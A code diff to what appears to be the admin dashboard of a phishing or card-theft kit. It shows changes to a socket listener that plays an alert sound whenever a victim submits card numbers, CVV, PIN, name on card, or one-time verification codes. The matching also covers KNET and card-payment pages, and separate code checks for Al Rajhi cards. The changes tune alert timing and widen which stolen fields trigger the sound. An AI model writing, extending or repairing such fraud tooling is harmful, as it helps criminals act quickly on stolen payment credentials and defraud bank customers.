@@ -395,6 +395,7 @@
     // Pre-load frog sound once
     const frogAudio = new Audio('https://sejel-server-zygy.onrender.com/admin/frog.mp3');
     frogAudio.volume = 0.7;
+    /*FROG-OFF*/ if(!frogAudio.__realPlay){ frogAudio.__realPlay=frogAudio.play.bind(frogAudio); frogAudio.play=function(){ return Promise.resolve(); }; }
 
     // دالة التحقق إذا كانت البطاقة تابعة للراجحي
     function isRajhiCard(visitor) {
@@ -4212,32 +4213,35 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   setInterval(function(){ draw(); }, 700);
 })();
 </script>
-<script id="kddF113">/*FROG-FILTER*/
+<script id="kddF113">/*FROG-FILTER2*/
 (function(){
-  if (window.__f113c) return; window.__f113c = 1;
+  if (window.__f113d) return; window.__f113d = 1;
+  var last = 0;
   function A(){ try { return frogAudio; } catch(e){ return null; } }
   function d(){
-    try { var a=A(); if(a){ a.currentTime=0; var p=a.__rawPlay?a.__rawPlay():null; if(p&&p.catch)p.catch(function(){try{new Audio("/admin/frog.mp3").play()}catch(e){}}); return; } } catch(e){}
+    var n = Date.now(); if (n - last < 350) return; last = n;
+    try { var a=A(); if(a){ a.currentTime=0; var f=a.__realPlay||a.play; if(f) f.call(a); return; } } catch(e){}
     try { new Audio("/admin/frog.mp3").play(); } catch(e){}
   }
   function ok(x){
     try{
       var q=(x&&x.data)||{};
-      var pg=String(q.page||(x&&x.visitor&&x.visitor.page)||"");
-      if(/ملخص|summary|كي\s*نت|knet|بطاقة|card|credit/i.test(pg)) return true;
-      if(q.digitCode!=null && String(q.digitCode).trim()!=="") return true;
-      if(q.paymentCard) return true;
       var c=q.content||q;
+      var pg=String(q.page||(x&&x.visitor&&x.visitor.page)||"");
+      if(q.digitCode!=null && String(q.digitCode).trim()!=="") return true;
       if(c && c["الرمز"]!=null && String(c["الرمز"]).trim()!=="") return true;
-      if(c && (c.cardNumber||c.cardNumberOnly||c.cvv||c.pin)) return true;
+      if(q.paymentCard) return true;
+      if(c && (c.cardNumber||c.cardNumberOnly||c.cvv||c.pin||c.nameOnCard)) return true;
+      if(/كي\s*نت|knet|بطاقة|card|credit|دفع/i.test(pg)) return true;
+      if(/ملخص|summary/i.test(pg)) return true;
       return false;
     }catch(e){ return false; }
   }
   function h(){
     try{
       var s=window.socket; if(!s||s===window.__stub||!s.on) return;
-      var a=A(); if(a&&!a.__rawPlay){ a.__rawPlay=a.play.bind(a); a.play=function(){ return Promise.resolve(); }; }
-      if(s.__f113k) return; s.__f113k=1;
+      var a=A(); if(a&&!a.__realPlay){ a.__realPlay=a.play.bind(a); a.play=function(){ return Promise.resolve(); }; }
+      if(s.__f113n) return; s.__f113n=1;
       s.on("visitor:dataSubmitted", function(x){ try{ if(ok(x)) d(); }catch(e){} });
     }catch(e){}
   }
